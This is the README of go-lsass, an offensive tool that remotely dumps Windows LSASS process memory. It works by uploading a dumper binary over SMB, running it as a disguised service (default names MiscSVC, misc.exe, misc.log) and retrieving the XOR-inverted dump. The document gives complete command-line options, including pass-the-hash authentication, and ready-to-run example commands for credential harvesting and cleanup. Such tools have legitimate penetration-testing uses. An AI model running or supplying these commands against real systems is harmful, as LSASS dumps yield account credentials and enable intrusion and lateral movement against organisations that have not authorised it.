# go-lsass

## Description
Package go-lsass is a tool built to dump the memory of the LSASS process
remotely by uploading a local LSASS dumper, executing it as a service and then
retrieve the dump file using SMB. It is built on top of the library
https://github.com/jfjallid/go-smb and is designed to primarily work with the
LSASS dumper https://github.com/jfjallid/processdumper.

**NOTE** that the LSASS dumper utility is not included in this repo but has to be
downloaded, compiled and then included by the --dumper flag or placed in the
current directory with a name of pdumpsvc.exe.
Also note that the dumpfile when created by the tool processdumper will be
inverted, e.g., every byte will be XOR:ed with 0xFF.

## Usage
```
Usage: ./go-lsass [options]

options:
      --host                Hostname or ip address of remote server
  -P, --port                SMB Port (default 445)
  -d, --domain              Domain name to use for login
  -u, --user                Username
  -p, --pass                Password
      --hash                Hex encoded NT Hash for user password
      --local               Authenticate as a local user instead of domain user
  -n, --null                Attempt null session authentication
  -t, --timeout             Dial timeout in seconds (default 5)
      --cleanup             Perform a cleanup of service binary, service, and dumpfile
      --dumper <path>       Path to local lsass dump utility (default pdumpsvc.exe)
      --service <name>      Name of service that will be created to run the lsass dumper (default MiscSVC)
      --service-filename    Name of service binary (default misc.exe)
      --service-dir         Remote path on C: to store service binary (default C:\windows\)
      --dumpfile            Name of lsass dump file written to disk (default misc.log)
      --dumpdir             Remote path on C: to temporarily store the lsass dump (default C:\windows\)
      --output              Path to where to store the lsass dump locally (default lsass.dmp)
      --noenc               Disable smb encryption
      --smb2                Force smb 2.1
      --debug               Enable debug logging
      --verbose             Enable verbose logging
  -v, --version             Show version
```

## Using a custom lsass dumper
The default dumper tested with this tool is
https://github.com/jfjallid/processdumper. It should be downloaded and compiled
with `make service` to create a PE32 file that can be executed as a Windows
service.

Support for other LSASS dumper binaries is limited to binaries that can be
executed as a Windows service and which accepts two cmdline arguments:
"lsass.exe" and location of where to store the dumpfile which is a combination
of the two arguments --dumpdir and --dumpfile. With default settings, the two
arguments to the service binary are: "lsass.exe" and "C:\windows\misc.log"

## Examples

### Dump LSASS on a domain joined machine using a local account

```
./go-lsass --host server001 --local --user Administrator --pass adminPass123 --dumper pdumpsvc.exe
```

### Dump LSASS on a domain joined machine using a domain user with a custom directory for the service binary and dump file 

```
./go-lsass --host server001 -d test.local --user testuser --pass secretPass123 --service-dir C:\\windows\\temp\\ --dumpdir C:\\windows\\temp\\
```

### Cleanup remote files and service manually when automatic cleanup failed
Note that if any of the following custom flags were used during deployment,
they are also required during cleanup:

- --service
- --service-filename
- --service-dir
- --dumpfile
- --dumpdir

```
./go-lsass --host server001 -d test.local --user testuser --pass secretPass123 --cleanup
```
